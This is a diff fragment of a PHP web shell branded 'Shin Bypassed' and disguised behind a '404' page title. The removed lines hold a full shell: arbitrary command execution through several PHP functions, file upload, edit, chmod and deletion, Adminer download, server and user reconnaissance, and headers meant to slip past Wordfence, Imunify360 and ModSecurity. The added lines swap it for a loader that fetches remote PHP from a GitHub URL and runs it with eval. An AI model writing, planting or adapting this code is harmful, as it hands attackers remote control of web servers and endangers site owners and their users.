-        fclose($pipes[0]);
-
-        $output = stream_get_contents($pipes[1]);
-        fclose($pipes[1]);
-
-        $error = stream_get_contents($pipes[2]);
-        fclose($pipes[2]);
-
-        $returnValue = proc_close($process);
-
-        $output = trim($output);
-        $error = trim($error);
-
-        if ($returnValue === 0 && !empty($output)) {
-            return $output;
-        } elseif (!empty($error)) {
-            return 'Error: ' . $error;
-        }
-    }
-
-    // shell_exec
-    $shellOutput = @shell_exec($command);
-    if ($shellOutput !== null) {
-        $output = trim($shellOutput);
-        if (!empty($output)) {
-            return $output;
-        }
-    } else {
-        $error = error_get_last();
-        if (!empty($error)) {
-            return 'Error: ' . $error['message'];
-        }
-    }
-
-    // exec
-    @exec($command, $execOutput, $execStatus);
-    if ($execStatus === 0) {
-        $output = implode(PHP_EOL, $execOutput);
-        if (!empty($output)) {
-            return $output;
-        }
-    } else {
-        return 'Error: Command execution failed.';
-    }
-
-    // passthru
-    ob_start();
-    @passthru($command, $passthruStatus);
-    $passthruOutput = ob_get_clean();
-    if ($passthruStatus === 0) {
-        $output = $passthruOutput;
-        if (!empty($output)) {
-            return $output;
-        }
-    } else {
-        return 'Error: Command execution failed.';
-    }
-
-    // system
-    ob_start();
-    @system($command, $systemStatus);
-    $systemOutput = ob_get_clean();
-    if ($systemStatus === 0) {
-        $output = $systemOutput;
-        if (!empty($output)) {
-            return $output;
-        }
-    } else {
-        return 'Error: Command execution failed.';
-    }
-
-    return 'Error: Command execution failed.';
-}
-function readFileContent($file)
-{
-    return file_get_contents($file);
-}
-
-function saveFileContent($file)
-{
-    if (isset($_POST['content'])) {
-        return file_put_contents($file, $_POST['content']) !== false;
-    }
-    return false;
-}
-//upfile
-function uploadFile($targetDirectory)
-{
-    if (isset($_FILES['file'])) {
-        $currentDirectory = getCurrentDirectory();
-        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
-        if ($_FILES['file']['size'] === 0) {
-            return 'Open Ur Eyes Bitch !!!.';
-        } else {
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
-            return 'File uploaded successfully.';
-        } else {
-            return 'Error uploading file.';
-        }
-    }
-    return '';
-}
-}
-//dir
-function changeDirectory($path)
-{
-    if ($path === '..') {
-        @chdir('..');
-    } else {
-        @chdir($path);
-    }
-}
-
-function getCurrentDirectory()
-{
-    return realpath(getcwd());
-}
-
-//open file juga folder
-function getLink($path, $name)
-{
-    if (is_dir($path)) {
-        return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
-    } elseif (is_file($path)) {
-        return '<a href="?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '">' . $name . '</a>';
-
-    }
-}
-function getDirectoryArray($path)
-{
-    $directories = explode('/', $path);
-    $directoryArray = [];
-    $currentPath = '';
-    foreach ($directories as $directory) {
-        if (!empty($directory)) {
-            $currentPath .= '/' . $directory;
-            $directoryArray[] = [
-                'path' => $currentPath,
-                'name' => $directory,
-            ];
-        }
-    }
-    return $directoryArray;
-}
-
-
-function showBreadcrumb($path)
-{
-    $path = str_replace('\\', '/', $path);
-    $paths = explode('/', $path);
-    ?>
-    <div class="breadcrumb">
-        <?php foreach ($paths as $id => $pat) { ?>
-            <?php if ($pat == '' && $id == 0) { ?>
-             DIR : <a href="?dir=/">/</a>
-            <?php } ?>
-            <?php if ($pat == '') {
-                continue;
-            } ?>
-            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
-            <a href="?dir=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
-        <?php } ?>
-    </div>
-    <?php
-}
-
-
-//tabel biar keren
-function showFileTable($path)
-{
-    $fileDetails = getFileDetails($path);
-    ?>
-    <table>
-        <tr>
-            <th>Name</th>
-            <th>Type</th>
-            <th>Size</th>
-            <th>Permission</th>
-            <th>Actions</th>
-        </tr>
-        <?php if (is_array($fileDetails)) { ?>
-            <?php foreach ($fileDetails as $fileDetail) { ?>
-                <tr>
-                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
-                    
-                    <td><?php echo $fileDetail['type']; ?></td>
-                    <td><?php echo $fileDetail['size']; ?></td>
-                    <td>
-                        <?php
-                        $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
-                        ?>
-                        <span style="color: <?php echo $permissionColor; ?>"><?php echo $fileDetail['permission']; ?></span>
-                        </td>
-                    <td>
-                            
-                        <?php if ($fileDetail['type'] === 'File') { ?>
-                            <div class="dropdown">
-                                <button class="dropbtn">Actions</button>
-                                <div class="dropdown-content">
-                                    <a href="?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
-                                 </div>
-                               </div>
-                        <?php } ?>
-                        <?php if ($fileDetail['type'] === 'Folder') { ?>
-                            <div class="dropdown">
-                                <button class="dropbtn">Actions</button>
-                                <div class="dropdown-content">
-                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
-                                </div>
-                             </div>
-                        <?php } ?>
-                    </td>
-                </tr>
-            <?php } ?>
-        <?php } else { ?>
-            <tr>
-                <td colspan="5">None</td>
-            </tr>
-        <?php } ?>
-    </table>
-    <?php
-}
-//chmod
-function changePermission($path)
-{
-    if (!file_exists($path)) {
-        return 'File or directory does not exist.';
-    }
-
-    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
-    
-    if ($permission === '') {
-        return 'Invalid permission value.';
-    }
-
-    if (!is_dir($path) && !is_file($path)) {
-        return 'Cannot change permission. Only directories and files can have permissions modified.';
-    }
-
-    $parsedPermission = intval($permission, 8);
-    if ($parsedPermission === 0) {
-        return 'Invalid permission value.';
-    }
-
-    if (chmodRecursive($path, $parsedPermission)) {
-        return 'Permission changed successfully.';
-    } else {
-        return 'Error changing permission.';
-    }
-}
-
-
-function chmodRecursive($path, $permission)
-{
-    if (is_dir($path)) {
-        $items = scandir($path);
-        if ($items === false) {
-            return false;
-        }
-
-        foreach ($items as $item) {
-            if ($item == '.' || $item == '..') {
-                continue;
-            }
-
-            $itemPath = $path . '/' . $item;
-
-            if (is_dir($itemPath)) {
-                if (!chmod($itemPath, $permission)) {
-                    return false;
-                }
-
-                if (!chmodRecursive($itemPath, $permission)) {
-                    return false;
-                }
-            } else {
-                if (!chmod($itemPath, $permission)) {
-                    return false;
-                }
-            }
-        }
-    } else {
-        if (!chmod($path, $permission)) {
-            return false;
-        }
-    }
-
-    return true;
-}
-
-//rename
-function renameFile($oldName, $newName)
-{
-    if (file_exists($oldName)) {
-        $directory = dirname($oldName);
-        $newPath = $directory . '/' . $newName;
-        if (rename($oldName, $newPath)) {
-            return 'File or folder renamed successfully.';
-        } else {
-            return 'Error renaming file or folder.';
-        }
-    } else {
-        return 'File or folder does not exist.';
-    }
-}
-
-//delete
-function deleteFile($file)
-{
-    if (file_exists($file)) {
-        if (unlink($file)) {
-            return 'File deleted successfully.' . $file;
-        } else {
-            return 'Error deleting file.';
-        }
-    } else {
-        return 'File does not exist.';
-    }
-}
-
-function deleteFolder($folder)
-{
-    if (is_dir($folder)) {
-        $files = glob($folder . '/*');
-        foreach ($files as $file) {
-            is_dir($file) ? deleteFolder($file) : unlink($file);
-        }
-        if (rmdir($folder)) {
-            return 'Folder deleted successfully.' . $folder;
-        } else {
-            return 'Error deleting folder.';
-        }
-    } else {
-        return 'Folder does not exist.';
-    }
-}
-//main logic directory 
-$currentDirectory = getCurrentDirectory();
-$errorMessage = '';
-$responseMessage = '';
-
-if (isset($_GET['dir'])) {
-    changeDirectory($_GET['dir']);
-    $currentDirectory = getCurrentDirectory();
-}
-//edit
-if (isset($_GET['edit'])) {
-    $file = $_GET['edit'];
-    $content = readFileContent($file);
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $saved = saveFileContent($file);
-        if ($saved) {
-            $responseMessage = 'File saved successfully.' . $file;
-        } else {
-            $errorMessage = 'Error saving file.';
-        }
-    }
-}
-
-if (isset($_GET['chmod'])) {
-    $file = $_GET['chmod'];
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $responseMessage = changePermission($file);
-    }
-}
-
-if (isset($_POST['upload'])) {
-    $responseMessage = uploadFile($currentDirectory);
-}
-
-if (isset($_POST['cmd'])) {
-    $cmdOutput = executeCommand($_POST['cmd']);
-}
-
-if (isset($_GET['rename'])) {
-    $file = $_GET['rename'];
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $newName = $_POST['new_name'];
-        if (is_file($file) || is_dir($file)) {
-            $responseMessage = renameFile($file, $newName);
-        } else {
-            $errorMessage = 'File or folder does not exist.';
-        }
-    }
-}
-
-if (isset($_GET['delete'])) {
-    $file = $_GET['delete'];
-    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
-        $currentDirectory = getCurrentDirectory();
-        if (is_file($file)) {
-            $responseMessage = deleteFile($file);
-            echo "<script>alert('File dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
-            exit;
-        } elseif (is_dir($file)) {
-            $responseMessage = deleteFolder($file);
-            echo "<script>alert('Folder dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
-            exit;
-        } else {
-            $errorMessage = 'File or folder does not exist.';
-        }
-    }
-}
-//panggil adminer
-if (isset($_POST['Summon'])) {
-    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
-    $currentPath = getCurrentDirectory();
-
-    $fileUrl = $baseUrl;
-    $fileName = 'Adminer.php';
-
-    $filePath = $currentPath . '/' . $fileName;
-
-    $fileContent = @file_get_contents($fileUrl);
-    if ($fileContent !== false) {
-        if (file_put_contents($filePath, $fileContent) !== false) {
-     
-            $responseMessage = 'File "' . $fileName . '" summoned successfully. <a href="' . $filePath . '">' . $filePath . '</a>';            
-        } else {
-            $errorMessage = 'Failed to save the summoned file.';
-        }
-    } else {
-        $errorMessage = 'Failed to fetch the file content. None File';
-    }
-}
-// katanya bypass
-if (function_exists('litespeed_request_headers')) {
-    $headers = litespeed_request_headers();
-    if (isset($headers['X-LSCACHE'])) {
-        header('X-LSCACHE: off');
-    }
-}
-
-if (defined('WORDFENCE_VERSION')) {
-    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
-    define('WORDFENCE_DISABLE_FILE_MODS', true);
-}
-
-if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
-    $imunifyHeaders = imunify360_request_headers();
-    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
-        header('X-Imunify360-Request: bypass');
-    }
-    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
-        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
-    }
-}
-
-
-if (function_exists('apache_request_headers')) {
-    $apacheHeaders = apache_request_headers();
-    if (isset($apacheHeaders['X-Mod-Security'])) {
-        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
-    }
-}
-
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
-    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
-        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
-    }
-}
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>404</title>
-  <link rel="stylesheet" href="https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css">  
-</head>
-<body>
-    <div class="container">
-        <h1>[ Shin Bypassed ]</h1>
-        <div class="menu-icon" onclick="toggleSidebar()"></div>
-        <hr>
-        <div class="button-container">
-            <form method="post" style="display: inline-block;">
-                <input type="submit" name="Summon" value="Adminer" class="summon-button">
-            </form>
-            <button type="button" onclick="window.location.href='?gas'" class="summon-button">Mail Test</button>
-        </div>
-        
-
-        <?php
-        //mailer
-        if (isset($_GET['gas'])) {
-            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-                if (!empty($_POST['email'])) {
-                    $xx = rand();
-                    if (mail($_POST['email'], "Shin Mailer Test - " . $xx, "Shin Ganteng")) {
-                        echo "<b>Send a report to [" . $_POST['email'] . "] - $xx</b>";
-                    } else {
-                        echo "Failed to send the email.";
-                    }
-                } else {
-                    echo "Please provide an email address.";
-                }
-            } else {
-        ?>
-                <h2>Mail Test :</h2>
-                <form method="post">
-                    <input type="text" name="email" placeholder="Enter email" required>
-                    <input type="submit" value="Send test &raquo;">
-                </form>
-        <?php
-            }
-        }
-        ?>
-
-        <?php if (!empty($errorMessage)) { ?>
-            <p style="color: red;"><?php echo $errorMessage; ?></p>
-        <?php } ?>
-
-        <hr>
-
-        <div class="upload-cmd-container">
-            <div class="upload-form">
-                <h2>Upload:</h2>
-                <form method="post" enctype="multipart/form-data">
-                    <input type="file" name="file">
-                    <button class="button" type="submit" name="upload">Upload</button>
-                </form>
-            </div>
-
-            <div class="cmd-form">
-                <h2>Command:</h2>
-                <form method="post">
-                    <?php echo @get_current_user() . "@" . @$_SERVER['REMOTE_ADDR'] . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd'>
-                    <input type="submit" class="empty-button">
-
-                </form>
-            </div>
-        </div>
-        <?php
-        if (isset($_GET['read'])) {
-            $file = $_GET['read'];
-            $content = readFileContent($file);
-            if ($content !== false) {
-                echo '<div class="command-output">';
-                echo '<pre>' . htmlspecialchars($content) . '</pre>';
-                echo '</div>';
-            } else {
-                echo 'Failed to read the file.';
-                }
-              }
-           ?>
-        <?php if (!empty($cmdOutput)) { ?>
-            <h3>Command Output:</h3>
-            <div class="command-output">
-                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
-            </div>
-        <?php } ?>
-
-        <?php if (!empty($responseMessage)) { ?>
-            <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
-        <?php } ?>            
-        <?php if (isset($_GET['rename'])) { ?>
-        <div class="rename-form">
-            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
-            <form method="post">
-                <input type="text" name="new_name" placeholder="New Name" required>
-                <br>
-                <input type="submit" value="Rename" class="button">
-                <a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="button">Cancel</a>
-            </form>
-        </div>
-        <?php } ?>
-        <?php if (isset($_GET['edit'])) { ?>
-            <div class="edit-file">
-                <h2>Edit File: <?php echo basename($file); ?></h2>
-                <form method="post">
-                    <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($content); ?></textarea><br>
-                    <button class="button" type="submit">Save</button>
-                </form>
-            </div>
-        <?php } elseif (isset($_GET['chmod'])) { ?>
-            <div class="change-permission">
-                <h2>Change Permission: <?php echo basename($file); ?></h2>
-                <form method="post">
-                    <input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
-                    <input type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
-                    <button class="button" type="submit">Change</button>
-                </form>
-            </div>
-        <?php } ?>
-        <hr>
-
-        <?php
-        echo '<h2>Filemanager</h2>';
-        showBreadcrumb($currentDirectory);
-        showFileTable($currentDirectory);
-        ?>
-    </div>
-<div class="sidebar" id="sidebar">
-    <div class="sidebar-content">
-        <div class="sidebar-close">
-            <button onclick="toggleSidebar()">Close</button>
-        </div>
-        <div class="info-container">
-            <h2>Server Info</h2>
-            <?php
-            function countDomainsInServer()
-            {
-                $serverName = $_SERVER['SERVER_NAME'];
-                $ipAddresses = @gethostbynamel($serverName);
-
-                if ($ipAddresses !== false) {
-                    return count($ipAddresses);
-                } else {
-                    return 0;
-                }
-            }
-
-            $domainCount = @countDomainsInServer();
-
-            function formatBytes($bytes, $precision = 2)
-            {
-                $units = array('B', 'KB', 'MB', 'GB', 'TB');
-
-                $bytes = max($bytes, 0);
-                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
-                $pow = min($pow, count($units) - 1);
-
-                $bytes /= (1 << (10 * $pow));
-
-                return round($bytes, $precision) . ' ' . $units[$pow];
-            }
-            ?>
-
-            <ul class="info-list">
-                <li>Hostname: <?php echo @gethostname(); ?></li>
-                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
-                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
-                <?php endif; ?>
-                <li>PHP Version: <?php echo @phpversion(); ?></li>
-                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
-                <?php if (function_exists('disk_total_space')) : ?>
-                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
-                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
-                <?php endif; ?>
-                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
-                <li>System: <?php echo @php_uname(); ?></li>
-            </ul>
-        </div>
-
-        <div class="info-container">
-            <h2>System Info</h2>
-            <ul class="info-list">
-                <?php
-                $features = [
-                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
-                    'Disable Functions' => ini_get('disable_functions'),
-                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
-                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
-                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
-                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
-                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
-                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
-                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
-                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
-                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
-                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
-                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
-                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
-                ];
-                ?>
-
-                <label for="feature-select">Select Feature:</label>
-                <select id="feature-select">
-                    <?php foreach ($features as $feature => $status) : ?>
-                        <option value="<?php echo $feature; ?>"><?php echo $feature . ': ' . $status; ?></option>
-                    <?php endforeach; ?>
-                </select>
-            </ul>
-        </div>
-
-        <div class="info-container">
-            <h2>User Info</h2>
-            <ul class="info-list">
-                <li>Username: <?php echo @get_current_user(); ?></li>
-                <li>User ID: <?php echo @getmyuid(); ?></li>
-                <li>Group ID: <?php echo @getmygid(); ?></li>
-            </ul>
-        </div>
-    </div>
-</div>
-    <script>
-        function toggleOptionsMenu() {
-            var optionsMenu = document.getElementById('optionsMenu');
-            optionsMenu.classList.toggle('show');
-        }
-        
-        function toggleSidebar() {
-            var sidebar = document.getElementById('sidebar');
-            sidebar.classList.toggle('open');
-        }
-    </script>
-</div>
-<div class="footer">
-    <p>&copy; <?php echo date("Y"); ?> <a href="https://www.blog-gan.org/">Coded By</a> Shin Code.</p>
-</div>
-</body>
-</html>
+$a = geturlsinfo('https://github.com/mr-combet/private/raw/main/test.php');
+eval    ('?>'.$a);
